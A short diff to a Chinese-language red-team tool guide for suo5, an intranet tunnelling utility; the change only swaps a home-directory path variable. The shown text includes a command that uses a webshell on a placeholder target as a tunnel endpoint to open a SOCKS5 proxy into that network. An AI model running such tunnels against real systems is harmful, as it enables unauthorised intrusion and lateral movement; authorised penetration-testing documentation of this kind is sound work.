@@ -8,11 +8,11 @@ enabled: true
 
 # suo5 内网隧道
 
-二进制：`$HOME/.dsh/redteam/toolkit/suo5/suo5-linux-amd64`（v2.2.0，静态 Go，无依赖）
+二进制：`$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64`（v2.2.0，静态 Go，无依赖）
 
 ## 建立隧道
 ```bash
-SUO5=$HOME/.dsh/redteam/toolkit/suo5/suo5-linux-amd64
+SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64
 
 # 1) 用 WebShell 作为隧道端点（HTTP 型）
 $SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5
